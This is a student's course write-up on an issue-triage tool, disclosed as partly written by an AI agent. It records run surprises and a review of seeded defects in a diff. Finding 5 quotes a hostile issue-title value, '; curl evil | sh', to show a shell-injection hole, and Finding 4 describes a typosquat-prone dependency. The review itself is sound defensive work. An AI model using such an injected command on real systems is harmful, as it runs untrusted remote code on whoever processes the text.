Name: Shay Hahiashvili
Date: 2026-10-31

# Exercise A - Execution findings

Execute your triage module on at least 20 issues from `data/snapshot/dev.json`. 
Look at the output. Write down anything that surprised you.

> Written with Claude (AI agent) from the run outputs in `runs/`; checked
> against the files.

Runs:
- `runs/dev-20-first-run.jsonl`: the first 20 issues of dev.json.
- `runs/dev-20-spread.jsonl`: 20 issues evenly spaced across dev.json.

Model for both: `gemini/gemini-3.5-flash-lite`.

---
### Surprise 1

- **Input issue json**: `data/snapshot/dev.json`, hono #4121 (gold_type `enhancement`)
- **Output triaged issue**: `{"repo": "hono", "number": 4121, "issue_type": "question", "component": "documentation", "severity": "low", "has_reproduction_steps": false, "confidence": 0.95, ...}`
- **What is surprising**: the type is wrong, yet confidence is 0.95. Across the spread run, confidence was 1.0 on 15/20 issues and never below 0.9. It carries almost no information, so a threshold on it (e.g. "escalate below 0.6") would never fire.

### Surprise 2

- **Input issue json**: the first 20 issues of `dev.json`
- **Output triaged issue**: `runs/dev-20-first-run.jsonl`, and all 20 are hono
- **What is surprising**: the snapshot is sorted by repo, so "run it on 20 issues" taken literally tests one repo out of three. Only 5 of those 20 had a gold type at all. The spread sample had 10/20 with a gold type, and 9 of those 10 matched.

### Surprise 3

- **Input issue json**: hono #4041, #4058, #4062, #4065 (first run)
- **Output triaged issue**: `TriageFailure` with `LMRateLimitError` (HTTP 429)
- **What is surprising**: the failures were not bad model output. The Gemini free tier refused a burst of calls. They came out as the same `TriageFailure` type as a validation failure, so a downstream reader cannot tell "the model was wrong" from "we never asked it". Fixed by pacing calls (`--delay`); the spread run had 0 failures.

### Surprise 4

- **Input issue json**: spread run, all 20
- **Output triaged issue**: severity was medium 12 / low 7 / high 1 / critical 0
- **What is surprising**: severity is almost always medium or low, and there is no gold label to check it against. The field the routing step will depend on most is the one we cannot measure.

### Surprise 5

- **Input issue json**: spread run, component field
- **Output triaged issue**: e.g. `netlify adapter`, `sqlalchemy plugin`, `domquery`, `ci`
- **What is surprising**: component is free text with no shared vocabulary. It cannot be compared with the per-repo gold components in `config/repos.toml`, or used as a routing key, without another normalisation step.


# Exercise B — Review findings

> NOTE (honest disclosure): I registered late and missed the W1 session.
> Part 1 was done by Claude (an AI agent) at my request, by reading the diff
> before anything was run. The detection rates below therefore measure an AI
> reviewer, not me. I have gone through each finding and can explain it.

## Part 1 — found by reading

Confidence: `certain` | `probable` | `uncertain`

---

### Finding 1

- **Location** (file:line): `src/triage_by_agent/router.py:63-73` (`route_raw`) versus `router.py:43-60` (`route`)
- **Confidence**: certain
- **What is wrong**: two routing functions implement two different policies.
  - `route_raw` drops the rule "bug without reproduction steps goes to `triage-clarify`".
  - It drops the rule "high severity with confidence < 0.6 escalates".
  - It works on the raw model dict, so none of `TriageRecord`'s guarantees hold on the batch path.
- **Why it matters**: the same issue gets a different queue and escalation flag depending on whether it came in alone or in a batch. Unreproducible bugs reach engineers, and nobody is paged for uncertain high-severity issues. The routing policy now lives in two places and will drift further.
- **What would have caught this**: a test that runs both paths on the same input and asserts they agree. Better still, a design where the batch path builds the same `TriageRecord` and calls `route()`, so there is only one policy.

---

### Finding 2

- **Location**: `src/triage_by_agent/policy.py:48-55` (`sla_for_raw`); consumed at `router.py:69-72`
- **Confidence**: certain
- **What is wrong**: severity is read straight from the model string with no `coerce_severity`.
  - `SLA_HOURS.get(..., DEFAULT_SLA_HOURS)` turns any miss into 72 hours, and a model answer of `"Critical"` or `"High"` is a miss.
  - The `== "critical"` check is also case-sensitive, so a critical issue is not escalated either.
- **Why it matters**: a critical issue silently gets a three-day SLA instead of four hours, with no error and no log line. This contradicts `sla_for`'s own docstring, which says the KeyError is deliberate so that this cannot happen silently.
- **What would have caught this**: a test with a capitalised severity, or validating the value so the `Literal` type applies. Neither exists. Every test fixture is lowercase, and the offline stub only emits lowercase.

---

### Finding 3

- **Location**: `policy.py:54`, `router.py:69`
- **Confidence**: certain
- **What is wrong**: the change introduces `ticket_priority` as a second name for `severity`. `schema.py` opens with a VOCABULARY block saying nothing in the package calls severity "priority", because there should be "one concept, one name".
- **Why it matters**: this breaks the ubiquitous language. The next reader, or the next agent, will assume priority is a separate concept and may add a separate field for it. The two will then drift apart.
- **What would have caught this**: a review rule (or lint) against vocabulary synonyms. No test or type checker can catch this, so it needs a human.

---

### Finding 4

- **Location**: `src/triage_by_agent/similarity.py:7`; lazy import at `router.py:81`
- **Confidence**: certain (undeclared); probable (typosquat)
- **What is wrong**: the code imports `levenshtein_fast`.
  - The package is not declared in `pyproject.toml`.
  - It is not the well-known package. The real ones are `python-Levenshtein`/`Levenshtein` or `rapidfuzz`, so this name is open to typosquatting.
  - `# type: ignore[import-not-found]` silences the one tool that would have complained.
  - The import only runs inside `find_duplicates` when there are 2 or more issues. Every test uses 0 or 1 issues, so the tests pass while a real batch crashes.
- **Why it matters**:
  - Supply chain: running `pip install levenshtein_fast` would run code nobody reviewed.
  - Correctness: "All tests pass, CI is green" is true but tells us nothing.
- **What would have caught this**: any one of these:
  - a dependency review that checks every import is declared in `pyproject.toml`
  - a rule against `type: ignore` on imports
  - a test with 2 or more issues
  - running the batch once

---

### Finding 5

- **Location**: `src/triage_by_agent/similarity.py:14-21` (`blame_context`)
- **Confidence**: certain about the defect. The function is not currently called anywhere.
- **What is wrong**: it builds a shell command from the issue **title** with `subprocess.run(..., shell=True)`. Issue text is untrusted, so a title containing `; curl evil | sh` executes. `repo_path` is also interpolated without quoting.
- **Why it matters**: anyone who can open a GitHub issue could run commands. The function is dead code today, but it ships in the package, and the next change that starts using it becomes exploitable. It breaks the package's own rule that issue text is "never near a shell".
- **What would have caught this**: a security review rule (no `shell=True`, never put input in a command), a linter (bandit, or ruff S602), or a test with a hostile title. This is not in the instructor's seeded list, but it is a real defect.

---

### Finding 6

- **Location**: `router.py:95-104` (`process_batch`); `extract.py:73-87` (`triage_raw`); `cli.py:90-107`
- **Confidence**: probable
- **What is wrong**:
  - (a) Duplicate removal keys on `issue["number"]` only, but numbers repeat across repos. 3 numbers are shared in dev.json, so 3 issues silently drop out of duplicate detection.
  - (b) `Routing` carries no issue identity, and the output is only counts. There is no way to say which issue went where.
  - (c) `triage_raw` has no error handling, so one bad model call aborts the whole batch.
  - (d) There is no logging anywhere, so the fallbacks in Findings 1–2 leave no trace.
- **Why it matters**: the batch result cannot be audited or reproduced. When a critical issue lands in the wrong queue, nothing records why.
- **What would have caught this**: a specification of what the batch must output and log, plus a test with two issues that share a number across repos.

---

### Finding 7

- **Location**: `tests/exercise_b/test_batch.py`; PR description
- **Confidence**: certain
- **What is wrong**: the new tests cover only the happy path the code was written for.
  - Every fixture is lowercase.
  - No batch has more than 1 issue.
  - No test compares `route` with `route_raw`.
  - `has_reproduction_steps="true"` is passed as a string, which locks in the unvalidated shape.

  The PR offers "All tests pass, CI is green" as if that were evidence.
- **Why it matters**: the same agent wrote the code and the tests, so the tests share its blind spots. Green CI says nothing about the risky parts.
- **What would have caught this**: acceptance criteria written before the code by someone other than the implementer, plus a coverage or mutation check on `router.py`.

---

### Finding 8

- **Location**: `cli.py:124-131` (the `batch --limit` default)
- **Confidence**: uncertain (this is about cost, not correctness)
- **What is wrong**: `batch` defaults to the whole split (240 issues), while `triage` deliberately defaults to 5 because "a live run costs money". Without `--offline`, one command makes 240 paid calls, and on the free tier it would hit 429 errors that `triage_raw` does not handle.
- **Why it matters**: cost and reliability. The two subcommands have inconsistent defaults.
- **What would have caught this**: a review against the existing convention.

---

## Part 2 — found by running

The released zip already contained the changed package, so only `tests/exercise_b/` had to be applied. I then ran `uv run pytest`, `uv run pyright` and `batch --split dev --offline`.

### What the tooling found that I did not

- **Which tool**:
  - pytest: 20 passed, found nothing.
  - pyright: 1 error, `similarity.py:11` "Argument type is unknown" (from `levenshtein_fast`).
  - Running it: `batch --split dev --offline` triaged 240 issues, then crashed with `ModuleNotFoundError: No module named 'levenshtein_fast'`.
- **What it showed**: the tools only confirmed Finding 4. They found nothing that reading had missed.
- **Would I have found this by reading?**: yes. Finding 4 was found by reading, before running.

### What I found by reading that the tooling did not

- Finding 1 (`route` and `route_raw` disagree). A probe confirmed it: the same record goes to `triage-clarify` via `route` and to `engineering` via `route_raw`.
- Finding 2 (severity case). A probe confirmed it:
  - `"Critical"` gives 72 h and no escalation.
  - `"High"` gives 72 h.
  - `"Bug"` goes to `triage-clarify`.
- Finding 3 (`ticket_priority`). No tool can see naming.
- Finding 5 (shell injection). pyright and pytest are blind to it because the function is never called.
- Finding 6 (3 cross-repo number collisions in dev), Finding 7 (weak tests), Finding 8 (cost).
- Why the run missed Findings 1–2: the offline stub builds a validated `TriageRecord` first, so it only ever hands `route_raw` clean lowercase values. The stub hides exactly the hole the live model would hit.

### Anything the tooling reported that turned out not to be a problem

- The 26 pyright warnings in `extract.py` are the expected DSPy seam, relaxed on purpose in `pyproject.toml`. They are not defects.

---

## Scoring (fill in after the reveal)

The reveal (slides 35–39) lists 5 seeded defects:
1. `route`/`route_raw` disagree on policy, and the contract is lost on the batch path (Finding 1).
2. Severity case sensitivity with a silent 72 h fallback (Finding 2).
3. `ticket_priority` versus `severity`, which breaks the ubiquitous language (Finding 3).
4. The `levenshtein_fast` typosquat and undeclared dependency (Finding 4).
5. Verifiability: no logging, no specification, no success metric (Findings 6d and 7).

| | part 1 (reading) | part 1 + part 2 |
|---|---|---|
| Seeded defects found | 5 | 5 |
| Seeded defects missed | 0 | 0 |
| False positives | 0 (Findings 5, 6a, 8 are real but not seeded) | 0 |

**Reading detection rate**: found / (found + missed) = 5 / 5 = 100%

**Combined detection rate**: found / (found + missed) = 5 / 5 = 100%

Tooling alone (pytest, pyright and the run) found 1 / 5 = 20%. It caught only the typosquat, and only because the package happened not to be installed.

### One sentence: what did you miss, and why do you think you missed it?

Reading missed nothing, but the tooling missed 4 of 5: the defects are about meaning (two policies, a synonym, a silent default, missing logging), which tests written by the change's own author and a stub that only emits clean values cannot see.
